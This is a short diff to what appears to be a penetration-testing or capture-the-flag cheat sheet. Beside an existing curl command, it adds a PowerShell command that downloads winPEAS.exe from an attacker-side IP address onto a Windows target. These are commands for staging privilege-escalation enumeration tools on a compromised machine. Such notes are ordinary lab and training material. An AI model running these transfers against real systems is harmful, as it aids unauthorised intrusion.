@@ -274,6 +274,12 @@ use curl on box if wget is not avaliable
 ```
 curl 10.4.9.144:8000/linpeas.sh > linpeas.sh
 ```
+
+on windows machine
+```
+powershell -c wget "http://10.4.9.144:8080/winPEAS.exe" -outfile "winPEAS.exe"
+```
+
 ## download files from box
 
 on own machine
